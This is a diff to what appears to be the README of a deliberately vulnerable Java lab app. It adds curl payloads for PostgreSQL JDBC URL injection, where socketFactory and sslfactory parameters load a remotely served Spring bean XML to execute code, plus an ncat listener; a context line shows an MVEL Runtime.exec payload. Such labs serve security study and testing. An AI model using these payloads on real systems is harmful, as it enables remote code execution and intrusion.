@@ -60,6 +60,22 @@ curl 127.0.0.1:8080/mvel/parse -d 'expression=Runtime.getRuntime().exec("open /S
 
 ### 反序列化
 
+### JDBC
+
+socket factory
+
+```
+curl 127.0.0.1:8080/drivermanager/connect -d 'url=jdbc:postgresql://localhost:5432/testdb?socketFactory%3dorg.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=http://127.0.0.1:8000/bean-exec.xml'
+```
+
+ssl factory
+
+```
+echo S | ncat -l -vv -p 5432
+
+curl 127.0.0.1:8080/drivermanager/connect -d 'url=jdbc:postgresql://localhost:5432/testdb?sslfactory%3dorg.springframework.context.support.FileSystemXmlApplicationContext%26sslfactoryarg=http://127.0.0.1:8000/bean-exec.xml'
+```
+
 #### readObject()
 
 ```
